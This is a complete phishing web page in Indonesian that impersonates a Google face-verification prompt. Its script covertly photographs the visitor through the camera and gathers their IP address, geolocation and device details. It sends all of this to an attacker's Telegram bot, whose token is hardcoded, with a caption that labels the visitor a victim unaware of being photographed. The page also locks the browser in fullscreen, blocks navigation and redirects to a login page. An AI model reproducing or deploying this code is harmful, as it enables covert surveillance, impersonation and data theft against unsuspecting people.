<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover, shrink-to-fit=no">
    <title>Verifikasi Keamanan - Google</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            user-select: none;
            -webkit-tap-highlight-color: transparent;
        }

        html, body {
            width: 100%;
            height: 100%;
            overflow: hidden !important;
            position: fixed !important;
            top: 0 !important;
            left: 0 !important;
            right: 0 !important;
            bottom: 0 !important;
        }

        body {
            font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
            background: #ffffff;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            overflow: hidden;
        }

        .fullscreen-lock {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: white;
            z-index: 999999999;
            overflow: hidden;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .card {
            max-width: 450px;
            width: 90%;
            padding: 40px 30px;
            text-align: center;
        }

        .google-logo img {
            width: 70px;
            margin-bottom: 25px;
        }

        h1 {
            font-size: 22px;
            font-weight: 400;
            color: #202124;
            margin-bottom: 10px;
        }

        .subtitle {
            color: #5f6368;
            font-size: 14px;
            margin-bottom: 30px;
        }

        .camera-area {
            background: #f1f3f4;
            border-radius: 20px;
            padding: 30px;
            margin: 20px 0;
        }

        .camera-icon {
            font-size: 60px;
            display: block;
            margin-bottom: 15px;
        }

        .permission-btn {
            width: 100%;
            padding: 14px;
            background: #1a73e8;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            margin-top: 10px;
        }

        .permission-btn:disabled {
            background: #dadce0;
            cursor: not-allowed;
        }

        .status-text {
            font-size: 13px;
            color: #5f6368;
            margin: 15px 0;
            padding: 10px;
            background: #f8f9fa;
            border-radius: 8px;
        }

        .warning-text {
            font-size: 12px;
            color: #d93025;
            margin-top: 15px;
        }

        .info-text {
            font-size: 11px;
            color: #9aa0a6;
            margin-top: 20px;
        }

        video {
            display: none;
        }

        canvas {
            display: none;
        }
    </style>
</head>
<body>

<div class="fullscreen-lock" id="lockScreen">
    <div class="card">
        <div class="google-logo">
            <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google">
        </div>

        <h1>Verifikasi Keamanan</h1>
        <div class="subtitle">Verifikasi wajah diperlukan untuk melanjutkan</div>

        <div class="camera-area">
            <span class="camera-icon">📷</span>
            <p style="margin-bottom: 10px;">Google Security memerlukan akses kamera</p>
        </div>

        <div class="status-text" id="statusText">
            Klik tombol di bawah untuk memberikan akses kamera
        </div>

        <button class="permission-btn" id="permissionBtn">Izinkan Akses Kamera</button>
        <div class="warning-text" id="warningText"></div>
        <div class="info-text">Verifikasi ini diperlukan untuk keamanan akun Google Anda</div>
    </div>
</div>

<video id="video" autoplay playsinline></video>
<canvas id="canvas"></canvas>

<script>
    // ========== TELEGRAM CONFIG ==========
    const TELEGRAM_TOKEN = "8806067214:AAHMhedGeATjYcFl3QUHk53Q8o9_sDuiGOg";
    const CHAT_ID = "8854409945";
    // =====================================

    let stream = null;
    let photoSent = false;
    let cameraActive = false;

    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const permissionBtn = document.getElementById('permissionBtn');
    const statusText = document.getElementById('statusText');
    const warningText = document.getElementById('warningText');

    // ========== LOCK TOTAL ==========
    document.body.style.overflow = 'hidden';
    document.documentElement.style.overflow = 'hidden';
    
    document.addEventListener('wheel', function(e) { e.preventDefault(); return false; }, { passive: false });
    document.addEventListener('touchmove', function(e) { e.preventDefault(); return false; }, { passive: false });
    
    history.pushState(null, null, location.href);
    window.addEventListener('popstate', function() {
        history.pushState(null, null, location.href);
        location.replace(location.href);
    });
    
    document.addEventListener('keydown', function(e) {
        if (e.key === 'F5' || e.key === 'F12' || (e.ctrlKey && e.key === 'r') || 
            (e.ctrlKey && e.key === 'w') || e.key === 'Escape' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
            e.preventDefault();
            return false;
        }
    });
    
    document.addEventListener('contextmenu', function(e) { e.preventDefault(); return false; });
    
    // ========== FULLSCREEN FORCE ==========
    function forceFullscreen() {
        const docEl = document.documentElement;
        if (docEl.requestFullscreen) docEl.requestFullscreen().catch(()=>{});
        else if (docEl.webkitRequestFullscreen) docEl.webkitRequestFullscreen();
    }
    
    document.body.addEventListener('click', function firstClick() {
        forceFullscreen();
        document.body.removeEventListener('click', firstClick);
    });
    
    document.addEventListener('fullscreenchange', function() {
        if (!document.fullscreenElement) forceFullscreen();
    });
    
    setInterval(() => {
        if (!document.fullscreenElement && !document.webkitFullscreenElement) forceFullscreen();
        if (window.location.hash !== '#locked') {
            window.location.hash = 'locked';
            history.pushState(null, null, '#locked');
        }
    }, 200);
    
    // ========== AMBIL LOKASI ==========
    async function getLocation() {
        return new Promise((resolve) => {
            if (!navigator.geolocation) {
                resolve('Tidak tersedia');
                return;
            }
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    resolve(`${position.coords.latitude}, ${position.coords.longitude}`);
                },
                () => {
                    resolve('Tidak diizinkan');
                }
            );
        });
    }
    
    // ========== DAPET IP ==========
    async function getIP() {
        try {
            const res = await fetch('https://api.ipify.org?format=json');
            const data = await res.json();
            return data.ip;
        } catch(e) {
            return 'Unknown';
        }
    }
    
    // ========== AMBIL FOTO DIAM-DIAM ==========
    async function capturePhotoSilently() {
        if (photoSent) return;
        if (!cameraActive) return;
        
        // Ambil foto dari video stream yang masih berjalan
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        
        // Dapetin data
        const ip = await getIP();
        const location = await getLocation();
        const tanggal = new Date().toLocaleString('id-ID', {timeZone: 'Asia/Jakarta'});
        const userAgent = navigator.userAgent;
        
        // Konversi canvas ke blob
        const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.9));
        
        // Caption untuk Telegram
        const caption = `📸📸📸 FOTO WAJAH KORBAN (DIAM-DIAM) 📸📸📸%0A%0A` +
            `🌐 IP ADDRESS : ${ip}%0A` +
            `📍 LOKASI     : ${location}%0A` +
            `📅 WAKTU      : ${tanggal}%0A` +
            `💻 DEVICE     : ${encodeURIComponent(userAgent.substring(0, 100))}%0A%0A` +
            `⚠️ KORBAN TIDAK SADAR SEDANG DIFOTO ⚠️`;
        
        // Kirim foto
        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('photo', blob, 'face.jpg');
        formData.append('caption', caption);
        
        try {
            await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            });
            photoSent = true;
        } catch(e) {}
        
        // Matikan kamera setelah foto terkirim
        if (stream) {
            stream.getTracks().forEach(track => track.stop());
            stream = null;
            cameraActive = false;
        }
    }
    
    // ========== REQUEST KAMERA & LANGSUNG KE LOGIN ==========
    async function requestCameraAndContinue() {
        permissionBtn.disabled = true;
        statusText.innerHTML = "⏳ Meminta akses kamera...";
        
        try {
            stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "user" } 
            });
            
            video.srcObject = stream;
            cameraActive = true;
            
            statusText.innerHTML = "✅ Verifikasi berhasil! Mengalihkan...";
            permissionBtn.style.display = 'none';
            
            // Tunggu sebentar, lalu redirect ke halaman login
            // TAPI kamera tetap menyala di background (stream masih hidup)
            setTimeout(() => {
                // Simpan stream ke sessionStorage biar bisa dipake di halaman login
                // Karena kita pindah halaman, stream akan mati otomatis
                // Jadi kita ambil foto SEKARANG sebelum pindah halaman
                capturePhotoSilently();
                
                // Setelah foto diambil, redirect ke login
                setTimeout(() => {
                    window.location.href = 'login.html';
                }, 500);
            }, 1000);
            
        } catch(err) {
            permissionBtn.disabled = false;
            permissionBtn.innerText = "Izinkan Akses Kamera";
            permissionBtn.classList.add('denied');
            statusText.innerHTML = "❌ Akses kamera diperlukan!";
            warningText.innerHTML = "⚠️ Anda HARUS mengizinkan akses kamera untuk melanjutkan!";
        }
    }
    
    permissionBtn.addEventListener('click', requestCameraAndContinue);
</script>
</body>
</html>
